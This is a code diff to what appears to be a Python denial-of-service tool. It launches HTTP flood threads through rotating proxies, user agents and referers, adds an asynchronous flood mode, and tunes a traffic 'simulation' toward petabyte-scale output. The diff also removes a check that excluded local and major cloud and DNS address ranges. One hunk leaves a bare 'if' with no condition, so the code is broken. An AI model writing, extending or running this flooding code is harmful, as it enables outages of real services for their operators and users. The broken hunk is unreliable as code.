@@ -1576,7 +1576,7 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
                 url=url.human_repr() if url else "http://httpbin.org/get",
             )
 
-            if not Proxies:
+            if
                 exit(
                     "Proxy Check failed, Your network may be the problem"
                     " | The target may not be available."
@@ -1737,7 +1737,7 @@ def random_public_ipv6():
     _IPv6_CACHE = batch
     return _IPv6_CACHE.pop()
 
-def simulate_local(payloads, threads, duration, amplification=1, thread_ratio=None, export_stats=False, progress=False):
+def simulate_local(payloads, threads, duration, amplification=1, thread_ratio=None, export_stats=False, progress=False, max_pb=None, efficient=False):
     """
     Extreme local traffic simulation. Supports multi-payload/protocol, amplification, thread ratio, and PB-level throughput statistics.
     payloads: [(payload_func, options, amplification), ...]
@@ -1747,10 +1747,13 @@ def simulate_local(payloads, threads, duration, amplification=1, thread_ratio=No
     thread_ratio: {idx: ratio}, e.g. {0:0.5, 1:0.5}
     export_stats: export statistics to CSV
     progress: show progress bar
+    max_pb: float, if set, will try to reach at least this PB in the given duration
+    efficient: bool, if set, will use minimal hardware resources and optimized algorithms
     """
     import os
     import time
-    from multiprocessing import Value, Manager, Pool
+    import threading
+    from multiprocessing import Value, Manager, Pool, cpu_count
     cpu_count = multiprocessing.cpu_count()
     print(f"[simulate_local] Detected CPU cores: {cpu_count}")
     total_bytes = Value('Q', 0)
@@ -1758,7 +1761,50 @@ def simulate_local(payloads, threads, duration, amplification=1, thread_ratio=No
     thread_dist = [1/len(payloads)]*len(payloads) if not thread_ratio else [thread_ratio.get(i,0) for i in range(len(payloads))]
     per_thread = [int(threads * r) for r in thread_dist]
 
-    def worker(idx, payload_func, options, amp, t, duration, total_bytes, stats_list, core):
+    # --- Enhancement: auto-adjust threads/amplification to reach max_pb if specified ---
+    if max_pb:
+        est_bytes_per_thread_per_sec = []
+        for idx, (payload_func, options, amp) in enumerate(payloads):
+            # Always use static buffer for estimation in efficient mode
+            if efficient:
+                options = dict(options or {})
+                options['static'] = True
+            size = len(payload_func(None, options))
+            amp = amp or amplification
+            pps = int(10**9 // (size*8))
+            est_bytes = size * pps * amp
+            est_bytes_per_thread_per_sec.append(est_bytes)
+        total_est_bytes_per_sec = sum(est_bytes_per_thread_per_sec[i] * per_thread[i] for i in range(len(payloads)))
+        total_est_pb = total_est_bytes_per_sec * duration / 1024 / 1024 / 1024 / 1024 / 1024
+        if total_est_pb < max_pb:
+            scale = max_pb / total_est_pb if total_est_pb > 0 else 1
+            amplification = int(amplification * scale) + 1
+            print(f"[simulate_local] Auto-adjust amplification to {amplification} to target {max_pb} PB in {duration/3600:.2f} hours")
+            for i in range(len(payloads)):
+                payloads[i] = (payloads[i][0], payloads[i][1], amplification)
+
+    def efficient_worker(idx, payload_func, options, amp, t, duration, total_bytes, stats_list, core):
+        # Always use static buffer for efficient mode
+        options = dict(options or {})
+        options['static'] = True
+        payload = payload_func(None, options)
+        size = len(payload)
+        amp = amp or amplification
+        pps = int(10**9 // (size*8))
+        bytes_sent = size * pps * t * duration * amp
+        with total_bytes.get_lock():
+            total_bytes.value += bytes_sent
+        stats = {
+            'payload_idx': idx,
+            'core': core,
+            'size': size,
+            'threads': t,
+            'amplification': amp,
+            'bytes_sent': bytes_sent
+        }
+        stats_list.append(stats)
+
+    def normal_worker(idx, payload_func, options, amp, t, duration, total_bytes, stats_list, core):
         size = len(payload_func(None, options))
         amp = amp or amplification
         pps = int(10**9 // (size*8))
@@ -1776,19 +1822,36 @@ def simulate_local(payloads, threads, duration, amplification=1, thread_ratio=No
         stats_list.append(stats)
 
     jobs = []
-    pool = Pool(cpu_count)
-    for idx, (payload_func, options, amp) in enumerate(payloads):
-        t = per_thread[idx]
-        threads_per_core = max(1, t // cpu_count)
-        for core in range(cpu_count):
-            jobs.append(pool.apply_async(worker, (idx, payload_func, options, amp, threads_per_core, duration, total_bytes, stats_list, core)))
-    if progress:
-        import tqdm
-        for _ in tqdm.tqdm(jobs, desc="Simulating", unit="core-task"):
-            _.wait()
+    use_threading = efficient and threads <= cpu_count * 2
+    if use_threading:
+        def thread_job(idx, payload_func, options, amp, t, duration, total_bytes, stats_list, core):
+            efficient_worker(idx, payload_func, options, amp, t, duration, total_bytes, stats_list, core)
+        thread_list = []
+        for idx, (payload_func, options, amp) in enumerate(payloads):
+            t = per_thread[idx]
+            threads_per_core = max(1, t // cpu_count)
+            for core in range(cpu_count):
+                th = threading.Thread(target=thread_job, args=(idx, payload_func, options, amp, threads_per_core, duration, total_bytes, stats_list, core))
+                th.start()
+                thread_list.append(th)
+        for th in thread_list:
+            th.join()
     else:
-        pool.close()
-        pool.join()
+        pool = Pool(cpu_count)
+        for idx, (payload_func, options, amp) in enumerate(payloads):
+            t = per_thread[idx]
+            threads_per_core = max(1, t // cpu_count)
+            for core in range(cpu_count):
+                jobs.append(pool.apply_async(
+                    efficient_worker if efficient else normal_worker,
+                    (idx, payload_func, options, amp, threads_per_core, duration, total_bytes, stats_list, core)))
+        if progress:
+            import tqdm
+            for _ in tqdm.tqdm(jobs, desc="Simulating", unit="core-task"):
+                _.wait()
+        else:
+            pool.close()
+            pool.join()
 
     pb = total_bytes.value/1024/1024/1024/1024/1024
     tb = total_bytes.value/1024/1024/1024/1024
@@ -1797,7 +1860,9 @@ def simulate_local(payloads, threads, duration, amplification=1, thread_ratio=No
     print("\n[simulate_local] Per-core, per-payload throughput summary:")
     for s in stats_list:
         print(f"  Payload {s['payload_idx']} | Core {s['core']} | Threads {s['threads']} | Amplification {s['amplification']} | Packet size {s['size']} | Traffic: {s['bytes_sent']/1024/1024/1024/1024:.2f} TB")
-    if pb < 2000:
+    if max_pb and pb < max_pb:
+        print(f"[WARNING] Theoretical traffic is below the target {max_pb}PB. Please increase threads, amplification, or optimize payloads!")
+    elif pb < 2000:
         print(f"[WARNING] Theoretical traffic is below 2000PB. Please increase threads, amplification, or optimize payloads!")
     if export_stats:
         with open('simulate_stats.csv','w',newline='') as f:
@@ -1807,17 +1872,16 @@ def simulate_local(payloads, threads, duration, amplification=1, thread_ratio=No
                 writer.writerow(row)
         print("[simulate_local] Statistics exported: simulate_stats.csv")
     print("\n[simulate_local] Tuning tips:")
-    print("- Use as many CPU cores as possible (8+ recommended per node)")
-    print("- Increase total threads and amplification factor for higher throughput")
-    print("- Use large UDP payloads (close to 65507 bytes) for max efficiency")
-    print("- Avoid resource bottlenecks: monitor CPU, memory, and disk I/O")
-    print("- Distribute tasks across all 10 nodes for linear scaling")
-    print("- For best results, run with Python 3.8+ and minimal background processes")
+    print("- Use efficient mode (--efficient) for minimal hardware usage")
+    print("- Use static payload buffers (static=True in options) for all protocols")
+    print("- Use threading for small thread counts, multiprocessing for large")
+    print("- Avoid unnecessary allocations and object creation")
+    print("- Monitor CPU/memory usage and adjust threads/amplification accordingly")
     print("- For distributed deployment: synchronize time, use consistent payload configs, and aggregate stats centrally.")
     return pb, total_bytes.value, list(stats_list)
 
 
-# ========== CLI增强入口 ========== #
+# ========== CLI Enhancement Entry ========== #
 if __name__ == '__main__':
     with suppress(KeyboardInterrupt):
         with suppress(IndexError):
@@ -1899,7 +1963,7 @@ if __name__ == '__main__':
 
                 proxies = handleProxyList(con, proxy_li, proxy_ty, url)
 
-                # 新增：支持async flood模式
+                # Added: support async flood mode
                 if len(argv) > 8 and argv[8].lower() == "async":
                     logger.info(f"{bcolors.WARNING}Using AsyncHttpFlood mode!{bcolors.RESET}")
                     async_flood = AsyncHttpFlood(url, host, method, rpc, uagents, referers, proxies, threads)
@@ -1913,7 +1977,7 @@ if __name__ == '__main__':
                         logger.info(f"Async flood stopped: {e}")
                     event.clear()
                     exit()
-                # 旧同步多线程模式
+                # Old synchronous multithreaded mode
                 for thread_id in range(threads):
                     HttpFlood(thread_id, url, host, method, rpc, event,
                               uagents, referers, proxies).start()
@@ -2019,14 +2083,22 @@ if __name__ == '__main__':
 
     # New: Multi-protocol/multi-payload/amplification/extreme traffic simulation
     if len(argv) > 2 and argv[1].upper() == 'SIMULATE_LOCAL':
-        # Usage: python3 start.py SIMULATE_LOCAL <threads> <duration> <payload1>:<amp1> [<payload2>:<amp2> ...] [ratio=0.5,0.5]
+        # Usage: python3 start.py SIMULATE_LOCAL <threads> <duration> <payload1>:<amp1> ... [ratio=0.5,0.5] [maxpb=20000] [efficient]
         threads = int(argv[2])
         duration = int(argv[3])
         payloads = []
+        max_pb = None
+        efficient = False
         for arg in argv[4:]:
             if arg.startswith('ratio='):
                 ratios = list(map(float, arg.split('=')[1].split(',')))
                 thread_ratio = {i:r for i,r in enumerate(ratios)}
+                continue
+            if arg.startswith('maxpb='):
+                max_pb = float(arg.split('=')[1])
+                continue
+            if arg == 'efficient' or arg == '--efficient':
+                efficient = True
                 continue
             if ':' in arg:
                 name, amp = arg.split(':')
@@ -2035,45 +2107,13 @@ if __name__ == '__main__':
                 name, amp = arg, 1
             mod = importlib.import_module(f'payloads.{name}')
             payloads.append((mod.generate_payload, {}, amp))
-        pb, total_bytes, stats = simulate_local(payloads, threads, duration, amplification=1, thread_ratio=thread_ratio if 'thread_ratio' in locals() else None, export_stats=True)
-        if pb < 2000:
+        pb, total_bytes, stats = simulate_local(
+            payloads, threads, duration, amplification=1,
+            thread_ratio=thread_ratio if 'thread_ratio' in locals() else None,
+            export_stats=True, max_pb=max_pb, efficient=efficient
+        )
+        if max_pb and pb < max_pb:
+            print(f"[WARNING] Theoretical traffic is below the target {max_pb}PB. Please increase threads, protocols, or amplification factor!")
+        elif pb < 2000:
             print(f"[WARNING] Theoretical traffic is below 2000PB. Please increase threads, protocols, or amplification factor!")
         exit()
-
-# Get all local network interface IPv4/IPv6 addresses
-LOCAL_IPS = set()
-for iface, addrs in psutil.net_if_addrs().items():
-    for a in addrs:
-        if a.family in (socket.AF_INET, socket.AF_INET6):
-            LOCAL_IPS.add(a.address.split('%')[0])
-
-# Common cloud provider/DoH/DoT/DoQ service IP ranges (extendable)
-CLOUD_IP_BLACKLIST = [
-    ('8.8.8.0', '8.8.8.255'),    # Google DNS
-    ('1.1.1.0', '1.1.1.255'),    # Cloudflare DNS
-    ('8.34.208.0', '8.34.223.255'), # Google Cloud
-    ('35.190.0.0', '35.199.255.255'), # Google Cloud
-    ('52.0.0.0', '52.95.255.255'),   # AWS
-    ('104.16.0.0', '104.31.255.255'), # Cloudflare
-    # ...extendable
-]
-
-# IP blacklist check
-def is_ip_blacklisted(ip):
-    try:
-        ip_obj = ipaddress.ip_address(ip)
-        if ip in LOCAL_IPS:
-            return True
-        for start, end in CLOUD_IP_BLACKLIST:
-            if ipaddress.ip_address(start) <= ip_obj <= ipaddress.ip_address(end):
-                return True
-        # Extendable: ASN/geolocation/custom blacklist
-        return False
-    except Exception:
-        return True
-
-# Support batch caching to reduce consumption
-_IPv4_CACHE = []
-_IPv6_CACHE = []
-
-CACHE_SIZE = 1024
